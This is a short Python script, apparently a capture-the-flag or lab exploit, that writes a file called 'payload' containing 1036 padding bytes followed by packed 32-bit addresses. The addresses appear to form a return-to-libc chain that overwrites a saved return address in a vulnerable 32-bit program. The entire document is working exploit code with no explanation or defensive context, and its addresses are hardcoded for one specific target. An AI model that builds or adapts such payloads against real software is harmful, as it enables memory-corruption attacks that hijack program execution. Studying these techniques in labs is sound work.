import struct, os

def dd(v):
    return struct.pack("I", v)

buf = ""
buf += dd(0xf7e06f40)
buf += dd(0xdeadbeef)
buf += dd(0xf7dda5e1)
buf += dd(0xf7dda38d)

with open("payload", "wb") as f:
    f.write("A" * 1036)
    f.write(buf)
